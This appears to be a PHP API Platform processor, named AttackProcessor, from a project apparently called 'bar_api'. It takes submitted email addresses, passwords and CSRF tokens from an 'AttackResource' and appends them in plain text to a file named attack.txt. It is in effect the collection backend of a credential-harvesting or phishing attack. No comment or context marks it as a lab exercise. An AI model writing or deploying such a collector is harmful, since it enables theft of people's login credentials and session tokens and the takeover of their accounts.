<?php

namespace App\State;

use ApiPlatform\Metadata\Operation;
use ApiPlatform\State\ProcessorInterface;
use App\ApiResource\Auth\AttackResource;

class AttackProcessor implements ProcessorInterface
{
    private $filename = "/Users/user/PhpstormProjects/bar_api/images/attack.txt";

    public function process(mixed $data, Operation $operation, array $uriVariables = [], array $context = []): void
    {
        if (get_class($data) === AttackResource::class) {
            file_put_contents($this->filename, $data->getEmail() . PHP_EOL, FILE_APPEND | LOCK_EX);
            file_put_contents($this->filename, $data->getPassword() . PHP_EOL,
                FILE_APPEND | LOCK_EX);
            file_put_contents($this->filename, $data->getCsrfToken() . PHP_EOL,
                FILE_APPEND | LOCK_EX);
        }
    }
}
